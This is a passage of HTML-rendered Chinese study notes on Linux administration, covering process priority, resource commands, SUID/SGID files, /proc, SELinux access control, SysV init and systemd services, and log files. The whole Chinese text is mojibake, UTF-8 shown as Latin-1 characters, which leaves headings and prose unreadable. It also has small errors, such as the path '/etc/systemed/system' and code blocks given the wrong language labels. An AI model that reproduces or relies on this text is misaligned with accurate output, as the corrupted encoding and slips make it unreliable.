id="renice-å·²å­˜åœ¨çš„è¿›ç¨‹çš„-nice-é‡æ–°è°ƒæ•´"><a href="#renice-å·²å­˜åœ¨çš„è¿›ç¨‹çš„-nice-é‡æ–°è°ƒæ•´" class="headerlink" title="renice : å·²å­˜åœ¨çš„è¿›ç¨‹çš„ nice é‡æ–°è°ƒæ•´"></a>renice : å·²å­˜åœ¨çš„è¿›ç¨‹çš„ nice é‡æ–°è°ƒæ•´</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ renice [<span class="hljs-built_in">number</span>] PID<br></code></pre></td></tr></table></figure><h3 id="16-3-4-æŸ¥çœ‹ç³»ç»Ÿèµ„æºä¿¡æ¯"><a href="#16-3-4-æŸ¥çœ‹ç³»ç»Ÿèµ„æºä¿¡æ¯" class="headerlink" title="16.3.4 æŸ¥çœ‹ç³»ç»Ÿèµ„æºä¿¡æ¯"></a>16.3.4 æŸ¥çœ‹ç³»ç»Ÿèµ„æºä¿¡æ¯</h3><ul><li>freeï¼ŒæŸ¥çœ‹å†…å­˜ä½¿ç”¨æƒ…å†µ</li><li>uname, æŸ¥çœ‹ç³»ç»Ÿä¸å†…æ ¸ç›¸å…³ä¿¡æ¯</li><li>uptimeï¼ŒæŸ¥çœ‹ç³»ç»Ÿå¯åŠ¨æ—¶é—´ä¸ä»»åŠ¡è´Ÿè½½</li><li>netstatï¼Œè¿½è¸ªç½‘ç»œæˆ– socket æ–‡ä»¶</li><li>dmesg, åˆ†æå†…æ ¸äº§ç”Ÿçš„ä¿¡æ¯</li><li>vmstat, æ£€æµ‹ç³»ç»Ÿèµ„æºå˜åŒ–</li></ul><h2 id="16-4-ç‰¹æ®Šæ–‡ä»¶ä¸è¿›ç¨‹"><a href="#16-4-ç‰¹æ®Šæ–‡ä»¶ä¸è¿›ç¨‹" class="headerlink" title="16.4 ç‰¹æ®Šæ–‡ä»¶ä¸è¿›ç¨‹"></a>16.4 ç‰¹æ®Šæ–‡ä»¶ä¸è¿›ç¨‹</h2><h3 id="16-4-1-å…·æœ‰-SUID-x2F-SGID-æƒé™çš„å‘½ä»¤æ‰§è¡ŒçŠ¶æ€"><a href="#16-4-1-å…·æœ‰-SUID-x2F-SGID-æƒé™çš„å‘½ä»¤æ‰§è¡ŒçŠ¶æ€" class="headerlink" title="16.4.1 å…·æœ‰ SUID&#x2F;SGID æƒé™çš„å‘½ä»¤æ‰§è¡ŒçŠ¶æ€"></a>16.4.1 å…·æœ‰ SUID&#x2F;SGID æƒé™çš„å‘½ä»¤æ‰§è¡ŒçŠ¶æ€</h3><p>SUID ç‰¹ç‚¹:</p><ul><li>SUID æƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ</li><li>æ‰§è¡Œè¿™å¯¹äºè¯¥ç¨‹åºéœ€è¦å…·æœ‰ x çš„å¯æ‰§è¡Œæƒé™</li><li>æœ¬æƒé™ä»…åœ¨æ‰§è¡Œè¯¥ç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ (run-time)</li><li>æ‰§è¡Œè€…å°†å…·æœ‰è¯¥ç¨‹åºæ‹¥æœ‰è€…çš„æƒé™<br>æŸ¥è¯¢æ•´ä¸ªç³»ç»Ÿçš„ SUID&#x2F;SGID çš„æ–‡ä»¶:<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm /</span><span class="hljs-number">6000</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="16-4-2-proc-ä»£è¡¨çš„å«ä¹‰"><a href="#16-4-2-proc-ä»£è¡¨çš„å«ä¹‰" class="headerlink" title="16.4.2 /proc/* ä»£è¡¨çš„å«ä¹‰"></a>16.4.2 <code>/proc/*</code> ä»£è¡¨çš„å«ä¹‰</h3><p>è¿›ç¨‹éƒ½æ˜¯åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œå†…å­˜ä¸­çš„æ•°æ®åˆéƒ½æ˜¯å†™å…¥åˆ° <code>/proc/*</code> è¿™ä¸ªç›®å½•ä¸‹çš„. ä¸»æœºä¸Šé¢çš„å„ä¸ªè¿›ç¨‹çš„ PID éƒ½ä»¥ç›®å½•çš„å½¢å¼å­˜åœ¨äº <code>/proc</code> ä¸­ã€‚</p><p><code>/proc</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç›¸å…³çš„æ–‡ä»¶å¯¹åº”ç›¸å…³çš„å†…å®¹ã€‚</p><h3 id="16-4-3-æŸ¥è¯¢å·²ä½¿ç”¨æ–‡ä»¶æˆ–å·²æ‰§è¡Œè¿›ç¨‹ä½¿ç”¨çš„æ–‡ä»¶"><a href="#16-4-3-æŸ¥è¯¢å·²ä½¿ç”¨æ–‡ä»¶æˆ–å·²æ‰§è¡Œè¿›ç¨‹ä½¿ç”¨çš„æ–‡ä»¶" class="headerlink" title="16.4.3 æŸ¥è¯¢å·²ä½¿ç”¨æ–‡ä»¶æˆ–å·²æ‰§è¡Œè¿›ç¨‹ä½¿ç”¨çš„æ–‡ä»¶"></a>16.4.3 æŸ¥è¯¢å·²ä½¿ç”¨æ–‡ä»¶æˆ–å·²æ‰§è¡Œè¿›ç¨‹ä½¿ç”¨çš„æ–‡ä»¶</h3><h4 id="fuser-å€Ÿç”±æ–‡ä»¶-æˆ–æ–‡ä»¶ç³»ç»Ÿ-æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨è¯¥æ–‡ä»¶çš„è¿›ç¨‹"><a href="#fuser-å€Ÿç”±æ–‡ä»¶-æˆ–æ–‡ä»¶ç³»ç»Ÿ-æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨è¯¥æ–‡ä»¶çš„è¿›ç¨‹" class="headerlink" title="fuser: å€Ÿç”±æ–‡ä»¶ (æˆ–æ–‡ä»¶ç³»ç»Ÿ) æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨è¯¥æ–‡ä»¶çš„è¿›ç¨‹"></a>fuser: å€Ÿç”±æ–‡ä»¶ (æˆ–æ–‡ä»¶ç³»ç»Ÿ) æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨è¯¥æ–‡ä»¶çš„è¿›ç¨‹</h4><h4 id="lsof-åˆ—å‡ºè¢«è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ–‡ä»¶åç§°"><a href="#lsof-åˆ—å‡ºè¢«è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ–‡ä»¶åç§°" class="headerlink" title="lsof: åˆ—å‡ºè¢«è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ–‡ä»¶åç§°"></a>lsof: åˆ—å‡ºè¢«è¿›ç¨‹æ‰€ä½¿ç”¨çš„æ–‡ä»¶åç§°</h4><h4 id="pidof-æ‰¾å‡ºæŸä¸ªæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹çš„-PID"><a href="#pidof-æ‰¾å‡ºæŸä¸ªæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹çš„-PID" class="headerlink" title="pidof: æ‰¾å‡ºæŸä¸ªæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹çš„ PID"></a>pidof: æ‰¾å‡ºæŸä¸ªæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹çš„ PID</h4><h3 id="16-5-SELinux-åˆæ¢"><a href="#16-5-SELinux-åˆæ¢" class="headerlink" title="16.5 SELinux åˆæ¢"></a>16.5 SELinux åˆæ¢</h3><h4 id="16-5-1-ä»€ä¹ˆæ˜¯-SELinux"><a href="#16-5-1-ä»€ä¹ˆæ˜¯-SELinux" class="headerlink" title="16.5.1 ä»€ä¹ˆæ˜¯ SELinux"></a>16.5.1 ä»€ä¹ˆæ˜¯ SELinux</h4><p>SELinux æ˜¯ Security Enhanced Linux çš„ç¼©å†™ </p><h4 id="å½“åˆè®¾è®¡çš„ç›®æ ‡ï¼š-é¿å…èµ„æºè¯¯ç”¨"><a href="#å½“åˆè®¾è®¡çš„ç›®æ ‡ï¼š-é¿å…èµ„æºè¯¯ç”¨" class="headerlink" title="å½“åˆè®¾è®¡çš„ç›®æ ‡ï¼š é¿å…èµ„æºè¯¯ç”¨"></a>å½“åˆè®¾è®¡çš„ç›®æ ‡ï¼š é¿å…èµ„æºè¯¯ç”¨</h4><p>SELinux æ˜¯æ•´åˆåˆ°å†…æ ¸çš„ä¸€ä¸ªæ¨¡å—ï¼Œæ›´å¤šå†…å®¹å¯å‚è€ƒ <a href="https://www.nsa.gov/what-we-do/research/selinux">é“¾æ¥</a></p><p>SELinux æ˜¯åœ¨è¿›è¡Œè¿›ç¨‹ï¼Œæ–‡ä»¶ç­‰è¯¦ç»†æƒé™é…ç½®æ—¶ä¾æ®çš„ä¸€ä¸ªå†…æ ¸æ¨¡å—ã€‚</p><h4 id="ä¼ ç»Ÿçš„æ–‡ä»¶æƒé™ä¸å¸å·çš„å…³ç³»-è‡ªä¸»è®¿é—®æ§åˆ¶"><a href="#ä¼ ç»Ÿçš„æ–‡ä»¶æƒé™ä¸å¸å·çš„å…³ç³»-è‡ªä¸»è®¿é—®æ§åˆ¶" class="headerlink" title="ä¼ ç»Ÿçš„æ–‡ä»¶æƒé™ä¸å¸å·çš„å…³ç³»: è‡ªä¸»è®¿é—®æ§åˆ¶"></a>ä¼ ç»Ÿçš„æ–‡ä»¶æƒé™ä¸å¸å·çš„å…³ç³»: è‡ªä¸»è®¿é—®æ§åˆ¶</h4><p>å„ç§æƒé™è®¾ç½®å¯¹ root æ˜¯æ— æ•ˆçš„.</p><p>DAC, Discretionary Access Control, è‡ªä¸»è®¿é—®æ§åˆ¶, å³ï¼Œå½“æŸä¸ªè¿›ç¨‹æƒ³è¦å¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæ ¹æ®è¿›ç¨‹çš„æ‹¥æœ‰è€…å’Œç”¨æˆ·ç»„ï¼Œå¯¹æ¯”æ–‡ä»¶çš„æƒé™ï¼Œåªæœ‰é€šè¿‡æƒé™æ£€æŸ¥ï¼Œæ‰å¯ä»¥è¯»å†™æ–‡ä»¶çš„æ–¹å¼.</p><h4 id="ä»¥ç­–ç•¥è§„åˆ™åˆ¶å®šè¿›ç¨‹è¯»å–ç‰¹å®šæ–‡ä»¶-å¼ºåˆ¶è®¿é—®æ§åˆ¶-MAC"><a href="#ä»¥ç­–ç•¥è§„åˆ™åˆ¶å®šè¿›ç¨‹è¯»å–ç‰¹å®šæ–‡ä»¶-å¼ºåˆ¶è®¿é—®æ§åˆ¶-MAC" class="headerlink" title="ä»¥ç­–ç•¥è§„åˆ™åˆ¶å®šè¿›ç¨‹è¯»å–ç‰¹å®šæ–‡ä»¶: å¼ºåˆ¶è®¿é—®æ§åˆ¶ (MAC)"></a>ä»¥ç­–ç•¥è§„åˆ™åˆ¶å®šè¿›ç¨‹è¯»å–ç‰¹å®šæ–‡ä»¶: å¼ºåˆ¶è®¿é—®æ§åˆ¶ (MAC)</h4><p>MAC, Mandatory Access Control, å¼ºåˆ¶è®¿é—®æ§åˆ¶ã€‚ç”¨æˆ·çš„æƒé™æ ¹æ®è¿›ç¨‹è€Œå®šï¼Œroot æ‰€è·å–çš„æƒé™ä¹Ÿä¸ä¸€å®šæ˜¯ root.</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œhttpd è¿™ä¸ªè¿›ç¨‹ä»…èƒ½åœ¨ <code>/var/www/</code> è¿™ä¸ªç›®å½•ä¸‹è¯»å–æ–‡ä»¶.</p><h4 id="16-5-2-SELinux-çš„è¿è¡Œæ¨¡å¼"><a href="#16-5-2-SELinux-çš„è¿è¡Œæ¨¡å¼" class="headerlink" title="16.5.2 SELinux çš„è¿è¡Œæ¨¡å¼"></a>16.5.2 SELinux çš„è¿è¡Œæ¨¡å¼</h4><ul><li>ä¸»ä½“ (subject), SELinux ä¸»è¦ç®¡ç†çš„å°±æ˜¯è¿›ç¨‹</li><li>ç›®æ ‡ (Object), ä¸»ä½“è¿›ç¨‹èƒ½å¦è¯»å†™çš„ç›®æ ‡èµ„æºä¸€èˆ¬å°±æ˜¯æ–‡ä»¶ç³»ç»Ÿ.</li><li>ç­–ç•¥ (Policy), è¿™äº›ç­–ç•¥å†…è¿˜ä¼šæœ‰è¯¦ç»†çš„è§„åˆ™ (rule) æ¥æŒ‡å®šä¸åŒçš„æœåŠ¡æ˜¯å¦å¼€æ”¾æŸäº›èµ„æºçš„è¯»å†™</li></ul><p>SELinux çš„é‡ç‚¹æ˜¯ä¿æŠ¤è¿›ç¨‹è¯»å–æ–‡ä»¶ç³»ç»Ÿçš„æƒé™.</p><h1 id="ç¬¬17ç« -è®¤è¯†ç³»ç»ŸæœåŠ¡-daemon"><a href="#ç¬¬17ç« -è®¤è¯†ç³»ç»ŸæœåŠ¡-daemon" class="headerlink" title="ç¬¬17ç«  è®¤è¯†ç³»ç»ŸæœåŠ¡(daemon)"></a>ç¬¬17ç«  è®¤è¯†ç³»ç»ŸæœåŠ¡(daemon)</h1><h2 id="17-1-ä»€ä¹ˆæ˜¯-daemon-ä¸æœåŠ¡-service"><a href="#17-1-ä»€ä¹ˆæ˜¯-daemon-ä¸æœåŠ¡-service" class="headerlink" title="17.1 ä»€ä¹ˆæ˜¯ daemon ä¸æœåŠ¡(service)"></a>17.1 ä»€ä¹ˆæ˜¯ daemon ä¸æœåŠ¡(service)</h2><p>ç³»ç»Ÿä¸ºäº†æŸäº›åŠŸèƒ½å¿…é¡»æä¾›ä¸€äº›æœåŠ¡ï¼Œè¿™ä¸ªæœåŠ¡å°±å«åš service, å®Œæˆ service çš„ç¨‹åºå« daemon. ä¹Ÿå°±æ˜¯è¯´, daemon æ˜¯ç¨‹åºï¼Œservice æ˜¯åŠŸèƒ½ã€‚</p><p>æœåŠ¡çš„åç§°å»ºç«‹ä¹‹åï¼Œåœ¨Linux ä¸­ä½¿ç”¨æ—¶ï¼Œé€šå¸¸åœ¨æœåŠ¡çš„åç§°åé¢åŠ ä¸Šä¸€ä¸ª â€˜dâ€™, è¿™ä¸ª â€˜dâ€™ ä»£è¡¨çš„å°±æ˜¯ daemon çš„æ„æ€ã€‚</p><h3 id="17-1-1-æ—©æœŸ-System-V-çš„-init-ç®¡ç†æ“ä½œä¸­-daemon-çš„ä¸»è¦åˆ†ç±»-Optional"><a href="#17-1-1-æ—©æœŸ-System-V-çš„-init-ç®¡ç†æ“ä½œä¸­-daemon-çš„ä¸»è¦åˆ†ç±»-Optional" class="headerlink" title="17.1.1 æ—©æœŸ System V çš„ init ç®¡ç†æ“ä½œä¸­ daemon çš„ä¸»è¦åˆ†ç±»(Optional)"></a>17.1.1 æ—©æœŸ System V çš„ init ç®¡ç†æ“ä½œä¸­ daemon çš„ä¸»è¦åˆ†ç±»(Optional)</h3><h4 id="æœåŠ¡çš„å¯åŠ¨ã€å…³é—­ä¸æŸ¥çœ‹ç­‰æ–¹å¼"><a href="#æœåŠ¡çš„å¯åŠ¨ã€å…³é—­ä¸æŸ¥çœ‹ç­‰æ–¹å¼" class="headerlink" title="æœåŠ¡çš„å¯åŠ¨ã€å…³é—­ä¸æŸ¥çœ‹ç­‰æ–¹å¼"></a>æœåŠ¡çš„å¯åŠ¨ã€å…³é—­ä¸æŸ¥çœ‹ç­‰æ–¹å¼</h4><p>æ‰€æœ‰çš„æœåŠ¡å¯åŠ¨è„šæœ¬æ”¾ç½®äº <code>/etc/init.d</code> ç›®å½•ã€‚</p><p>å¤„ç†æ–¹å¼:</p><ul><li>å¯åŠ¨: <code>/etc/init.d/daemon start</code></li><li>å…³é—­: <code>/etc/init.d/daemon stop</code></li><li>é‡æ–°å¯åŠ¨: <code>/etc/init.d/daemon restart</code></li><li>æŸ¥çœ‹çŠ¶æ€: <code>/etc/init.d/daemon status</code></li></ul><h4 id="æœåŠ¡å¯åŠ¨çš„åˆ†ç±»"><a href="#æœåŠ¡å¯åŠ¨çš„åˆ†ç±»" class="headerlink" title="æœåŠ¡å¯åŠ¨çš„åˆ†ç±»"></a>æœåŠ¡å¯åŠ¨çš„åˆ†ç±»</h4><h4 id="æœåŠ¡çš„ä¾èµ–æ€§é—®é¢˜"><a href="#æœåŠ¡çš„ä¾èµ–æ€§é—®é¢˜" class="headerlink" title="æœåŠ¡çš„ä¾èµ–æ€§é—®é¢˜"></a>æœåŠ¡çš„ä¾èµ–æ€§é—®é¢˜</h4><h4 id="è¿è¡Œçº§åˆ«çš„åˆ†ç±»"><a href="#è¿è¡Œçº§åˆ«çš„åˆ†ç±»" class="headerlink" title="è¿è¡Œçº§åˆ«çš„åˆ†ç±»"></a>è¿è¡Œçº§åˆ«çš„åˆ†ç±»</h4><p>åŸºæœ¬ä¸Š Linux æä¾›äº†7ä¸ªè¿è¡Œçº§åˆ«, åˆ†åˆ«æ˜¯ 0ã€1ã€2ã€3ã€4ã€5ã€6.</p><p>é“¾æ¥æ–‡ä»¶å(SXXdaemon)çš„åŠŸèƒ½ä¸º: S ä¸ºå¯åŠ¨è¯¥æœåŠ¡ï¼ŒXX æ˜¯æ•°å­—, ä¸ºå¯åŠ¨é¡ºåº.</p><h4 id="åˆ¶å®šè¿è¡Œçº§åˆ«é»˜è®¤è¦å¯åŠ¨çš„æœåŠ¡"><a href="#åˆ¶å®šè¿è¡Œçº§åˆ«é»˜è®¤è¦å¯åŠ¨çš„æœåŠ¡" class="headerlink" title="åˆ¶å®šè¿è¡Œçº§åˆ«é»˜è®¤è¦å¯åŠ¨çš„æœåŠ¡"></a>åˆ¶å®šè¿è¡Œçº§åˆ«é»˜è®¤è¦å¯åŠ¨çš„æœåŠ¡</h4><p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ“ä½œ:</p><ul><li>é»˜è®¤è¦å¯åŠ¨: chkconfig daemon on</li><li>é»˜è®¤ä¸å¯åŠ¨: chkconfig daemon off </li><li>æŸ¥çœ‹é»˜è®¤ä¸ºå¯åŠ¨ä¸å¦: chkconfig â€“list daemon</li></ul><h4 id="è¿è¡Œçº§åˆ«çš„åˆ‡æ¢æ“ä½œ"><a href="#è¿è¡Œçº§åˆ«çš„åˆ‡æ¢æ“ä½œ" class="headerlink" title="è¿è¡Œçº§åˆ«çš„åˆ‡æ¢æ“ä½œ"></a>è¿è¡Œçº§åˆ«çš„åˆ‡æ¢æ“ä½œ</h4><p>ä»å‘½ä»¤è¡Œç•Œé¢ (runlevel3) åˆ‡æ¢åˆ°å›¾å½¢ç•Œé¢ (runlevel5), åªéœ€ç”¨ <code>init 5</code> å³å¯ã€‚</p><p>è¿™é‡Œçš„å‘½ä»¤è¡Œç•Œé¢å°±æ˜¯ tty ç•Œé¢ã€‚Ubuntu ä¸Šä¹Ÿå¯è¡Œã€‚</p><h3 id="17-1-2-systemd-ä½¿ç”¨çš„-unit-åˆ†ç±»"><a href="#17-1-2-systemd-ä½¿ç”¨çš„-unit-åˆ†ç±»" class="headerlink" title="17.1.2 systemd ä½¿ç”¨çš„ unit åˆ†ç±»"></a>17.1.2 systemd ä½¿ç”¨çš„ unit åˆ†ç±»</h3><p>æ—§çš„ init å¯åŠ¨è„šæœ¬æ˜¯â€ä¸€é¡¹ä¸€é¡¹ä»»åŠ¡ä¾åºå¯åŠ¨â€çš„æ¨¡å¼ï¼Œé€Ÿåº¦è¾ƒæ…¢ã€‚</p><p>systemd è®©æ‰€æœ‰æœåŠ¡åŒæ—¶å¯åŠ¨ã€‚</p><p>systemd å¯ä»¥å…¼å®¹ init çš„å¯åŠ¨è„šæœ¬ï¼Œæ—§çš„ init çš„å¯åŠ¨è„šæœ¬èƒ½å¤Ÿé€šè¿‡ systemd æ¥ç®¡ç†ã€‚</p><p>å…¨éƒ¨çš„ systemd éƒ½ç”¨ systemctl è¿™ä¸ªç®¡ç†ç¨‹åºè¿›è¡Œç®¡ç†ï¼Œè€Œ systemctl æ”¯æŒçš„è¯­æ³•æœ‰é™åˆ¶ã€‚</p><p>å¦‚æœæŸä¸ªæœåŠ¡å¯åŠ¨æ˜¯ç®¡ç†å‘˜æ‰‹åŠ¨æ‰§è¡Œ(å³ç›´æ¥è¾“å…¥ daemon)ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ systemctl, é‚£ä¹ˆ systemd å°†æ— æ³•æ£€æµ‹åˆ°è¯¥æœåŠ¡ï¼Œæ— æ³•è¿›ä¸€æ­¥ç®¡ç†ã€‚</p><h4 id="systemd-çš„é…ç½®æ–‡ä»¶æ”¾ç½®ç›®å½•"><a href="#systemd-çš„é…ç½®æ–‡ä»¶æ”¾ç½®ç›®å½•" class="headerlink" title="systemd çš„é…ç½®æ–‡ä»¶æ”¾ç½®ç›®å½•"></a>systemd çš„é…ç½®æ–‡ä»¶æ”¾ç½®ç›®å½•</h4><p>systemd å°†è¿‡å» daemon æ‰§è¡Œè„šæœ¬é€šé€šç§°ä¸ºä¸€ä¸ªæœåŠ¡å•ä½(unit), æ¯ç§æœåŠ¡å•ä½ç”¨åŠŸèƒ½åŒºåˆ†.</p><p>é…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•:</p><ul><li><code>/usr/lib/systemd/system</code>: æ¯ä¸ªæœåŠ¡æœ€ä¸»è¦çš„å¯åŠ¨è„šæœ¬è®¾ç½®</li><li><code>/run/systemd/system</code>: ç³»ç»Ÿæ‰§è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æœåŠ¡è„šæœ¬ï¼Œå…¶è„šæœ¬çš„ä¼˜å…ˆçº§é«˜äº <code>/usr/lib/systemd/system</code> ä¸­</li><li><code>/etc/systemed/system</code>: ç®¡ç†å‘˜æ ¹æ®ä¸»æœºç³»ç»Ÿçš„éœ€æ±‚å»ºç«‹çš„æ‰§è¡Œè„šæœ¬ï¼Œå…¶ä¼˜å…ˆçº§æ¯” <code>/run/systemd/system</code> é«˜</li></ul><h4 id="systemd-çš„-unit-ç±»å‹åˆ†ç±»è¯´æ˜"><a href="#systemd-çš„-unit-ç±»å‹åˆ†ç±»è¯´æ˜" class="headerlink" title="systemd çš„ unit ç±»å‹åˆ†ç±»è¯´æ˜"></a>systemd çš„ unit ç±»å‹åˆ†ç±»è¯´æ˜</h4><p>é€šè¿‡æ‰©å±•ååˆ¤æ–­ã€‚</p><h2 id="17-2-é€šè¿‡-systemctl-ç®¡ç†æœåŠ¡"><a href="#17-2-é€šè¿‡-systemctl-ç®¡ç†æœåŠ¡" class="headerlink" title="17.2 é€šè¿‡ systemctl ç®¡ç†æœåŠ¡"></a>17.2 é€šè¿‡ systemctl ç®¡ç†æœåŠ¡</h2><p>systemd åªæœ‰ systemctl è¿™ä¸ªå‘½ä»¤æ¥å¤„ç†ã€‚</p><h3 id="17-2-1-é€šè¿‡-systemctl-ç®¡ç†å•ä¸€æœåŠ¡-service-unit-çš„å¯åŠ¨-x2F-å¼€æœºå¯åŠ¨ä¸æŸ¥çœ‹çŠ¶æ€"><a href="#17-2-1-é€šè¿‡-systemctl-ç®¡ç†å•ä¸€æœåŠ¡-service-unit-çš„å¯åŠ¨-x2F-å¼€æœºå¯åŠ¨ä¸æŸ¥çœ‹çŠ¶æ€" class="headerlink" title="17.2.1 é€šè¿‡ systemctl ç®¡ç†å•ä¸€æœåŠ¡ (service unit) çš„å¯åŠ¨&#x2F;å¼€æœºå¯åŠ¨ä¸æŸ¥çœ‹çŠ¶æ€"></a>17.2.1 é€šè¿‡ systemctl ç®¡ç†å•ä¸€æœåŠ¡ (service unit) çš„å¯åŠ¨&#x2F;å¼€æœºå¯åŠ¨ä¸æŸ¥çœ‹çŠ¶æ€</h3><p>æœåŠ¡çš„å¯åŠ¨ä¸€èˆ¬æœ‰ä¸¤ä¸ªé˜¶æ®µ:</p><ul><li>å¼€æœºæ—¶è¦ä¸è¦å¯åŠ¨</li><li>ç°åœ¨è¦ä¸è¦å¯åŠ¨</li></ul><p>systemctl å‘½ä»¤è¯­æ³•:</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ systemctl <span class="hljs-comment">[command]</span> <span class="hljs-comment">[unit]</span><br></code></pre></td></tr></table></figure><p><code>[command]</code> ä¸»è¦æœ‰:</p><ul><li>start </li><li>stop</li><li>restart</li><li>enable, è®¾ç½®ä¸‹æ¬¡å¼€æœºæ—¶ï¼Œåé¢çš„ unit ä¼šè¢«å¯åŠ¨</li><li>disable</li><li>status</li><li>is-active</li><li>is-enable</li></ul><p>ä¸åº”è¯¥ä½¿ç”¨ <code>kill</code> çš„æ–¹å¼æ¥å…³é—­ä¸€ä¸ªæ­£å¸¸çš„æœåŠ¡ã€‚</p><h1 id="ç¬¬18ç« -è®¤è¯†ä¸åˆ†ææ—¥å¿—æ–‡ä»¶"><a href="#ç¬¬18ç« -è®¤è¯†ä¸åˆ†ææ—¥å¿—æ–‡ä»¶" class="headerlink" title="ç¬¬18ç«  è®¤è¯†ä¸åˆ†ææ—¥å¿—æ–‡ä»¶"></a>ç¬¬18ç«  è®¤è¯†ä¸åˆ†ææ—¥å¿—æ–‡ä»¶</h1><h2 id="18-1-ä»€ä¹ˆæ˜¯æ—¥å¿—æ–‡ä»¶"><a href="#18-1-ä»€ä¹ˆæ˜¯æ—¥å¿—æ–‡ä»¶" class="headerlink" title="18.1 ä»€ä¹ˆæ˜¯æ—¥å¿—æ–‡ä»¶"></a>18.1 ä»€ä¹ˆæ˜¯æ—¥å¿—æ–‡ä»¶</h2><p>å°±æ˜¯è®°å½•ç³»ç»Ÿæ´»åŠ¨ä¿¡æ¯çš„å‡ ä¸ªæ–‡ä»¶.</p><h4 id="Linux-å¸¸è§çš„æ—¥å¿—æ–‡ä»¶å"><a href="#Linux-å¸¸è§çš„æ—¥å¿—æ–‡ä»¶å" class="headerlink" title="Linux å¸¸è§çš„æ—¥å¿—æ–‡ä»¶å"></a>Linux å¸¸è§çš„æ—¥å¿—æ–‡ä»¶å</h4><p>æ—¥å¿—æ–‡ä»¶çš„æƒé™é€šå¸¸æ˜¯è®¾ç½®ä¸ºä»…æœ‰ root èƒ½å¤Ÿè¯»å–.</p><p>å¸¸è§çš„æ—¥å¿—æ–‡ä»¶æœ‰:</p><ul><li>&#x2F;var&#x2F;log&#x2F;boot.log : åªä¼šå­˜å‚¨æœ¬æ¬¡å¼€æœºçš„ä¿¡æ¯</li><li>&#x2F;var&#x2F;log&#x2F;cron </li><li>&#x2F;var&#x2F;log&#x2F;dmesg</li><li>&#x2F;var&#x2F;log&#x2F;lastlog</li><li>&#x2F;var&#x2F;log&#x2F;maillog</li><li>&#x2F;var&#x2F;log&#x2F;messages</li><li>&#x2F;var&#x2F;log&#x2F;secure</li><li>&#x2F;var&#x2F;log&#x2F;wtmp, &#x2F;var&#x2F;log&#x2F;failing, è®°å½•æ­£ç¡®ç™»å½•ç³»ç»Ÿè€…çš„è´¦æˆ·ä¿¡æ¯ä¸é”™è¯¯ç™»å½•æ—¶æ‰€ä½¿ç”¨çš„è´¦æˆ·ä¿¡æ¯</li><li>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;<em>, &#x2F;var&#x2F;log&#x2F;samba&#x2F;</em></li></ul><h4 id="æ—¥å¿—æ–‡ä»¶æ‰€éœ€ç›¸å…³æœåŠ¡-daemon-ä¸ç¨‹åº"><a href="#æ—¥å¿—æ–‡ä»¶æ‰€éœ€ç›¸å…³æœåŠ¡-daemon-ä¸ç¨‹åº" class="headerlink" title="æ—¥å¿—æ–‡ä»¶æ‰€éœ€ç›¸å…³æœåŠ¡ (daemon) ä¸ç¨‹åº"></a>æ—¥å¿—æ–‡ä»¶æ‰€éœ€ç›¸å…³æœåŠ¡ (daemon) ä¸ç¨‹åº</h4><p>æ—¥å¿—æ–‡ä»¶çš„äº§ç”Ÿä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼:</p><ul><li>ç”±è½¯ä»¶å¼€å‘å•†è‡ªè¡Œå®šä¹‰å†™å…¥çš„æ—¥å¿—æ–‡ä»¶ä¸ç›¸å…³æ ¼å¼, å¦‚ WWW è½¯ä»¶ apache</li><li>å¦ Linux å‘è¡Œç‰ˆæä¾›çš„æ—¥å¿—æ–‡ä»¶ç®¡ç†æœåŠ¡æ¥ç»Ÿä¸€ç®¡ç†</li></ul><p>å¯ä»¥ä½¿ç”¨ logrotate å·¥å…·æ¥è‡ªåŠ¨åŒ–å¤„ç†æ—¥å¿—æ–‡ä»¶å®¹é‡ä¸æ›´æ–°. å…¶å°†å°±çš„æ—¥å¿—æ–‡ä»¶æ›´æ”¹åå­—ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªç©ºçš„æ—¥å¿—æ–‡ä»¶ï¼Œæ–°çš„æ—¥å¿—æ–‡ä»¶é‡æ–°å¼€å§‹è®°å½•ï¼Œæ—§çš„è®°å½•åœ¨ä¿å­˜ä¸€æ®µæ—¶é—´ä¹‹åå¯ä»¥è‡ªåŠ¨åˆ é™¤.</p><p>é’ˆå¯¹æ—¥å¿—æ–‡ä»¶æ‰€éœ€çš„åŠŸèƒ½ï¼Œéœ€è¦çš„æœåŠ¡ä¸ç¨‹åºæœ‰:</p><ul><li>systemd-journald.service, æœ€ä¸»è¦çš„ä¿¡æ¯è®°å½•è€…ï¼Œç”± systemd æä¾›</li><li>rsyslog.service, ä¸»è¦æ”¶é›†ç™»å½•ç³»ç»Ÿä¸ç½‘ç»œç­‰æœåŠ¡çš„ä¿¡æ¯</li><li>logrotate, æ—¥å¿—æ–‡ä»¶çš„è½®å¾ªåŠŸèƒ½</li></ul><p>systemd 